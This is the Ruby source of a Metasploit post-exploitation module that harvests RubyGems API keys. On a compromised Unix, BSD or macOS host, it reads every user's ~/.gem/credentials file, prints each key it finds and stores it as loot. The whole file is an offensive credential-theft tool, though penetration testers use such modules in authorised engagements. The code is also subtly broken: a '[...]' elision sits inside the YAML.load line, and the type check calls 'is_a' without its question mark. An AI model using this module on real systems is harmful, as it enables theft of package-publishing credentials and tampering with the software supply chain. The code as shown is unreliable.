##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'yaml'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Multi Gather RubyGems API Key ~/.gem/credentials',
      'Description'   => %q{
        This module obtains a user's RubyGems API key from ~/.gem/credentials.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Jonathan Claudius <jclaudius[at]trustwave.com>',
                           'Brandon Myers <bmyers[at]trustwave.com>' ],
      'Platform'      => %w{ bsd linux osx unix },
      'SessionTypes'  => %w{ shell }
    ))
  end

  def run
    print_status("Finding ~/.gem/credentials")
    paths = enum_user_directories.map {|d| d + "/.gem/credentials"}
    paths = paths.select { |f| file?(f) }

    if paths.empty?
      print_error("No users found with a ~/.gem/credentials file")
      return
    end

    download_loot(paths)
  end

  def download_loot(paths)
    print_status("Looting #{paths.count} files")
    paths.each do |path|
      path.chomp!
      next if [".", ".."].include?(path)

      rubygems_api_key = YAML.load(read_file(path))[:rubygems_api_key] [...]
      next unless rubygems_api_key.is_a(::String)
      
      print_good("Found a RubyGems API key #{rubygems_api_key}")

      loot_path = store_loot("host.rubygems.apikey",
                             "text/plain",
                             session,
                             rubygems_api_key,
                             "ruby_api_key.txt",
                             "Ruby API Key")

      print_good("RubyGems API key stored in #{loot_path.to_s}")
    end
  end

end
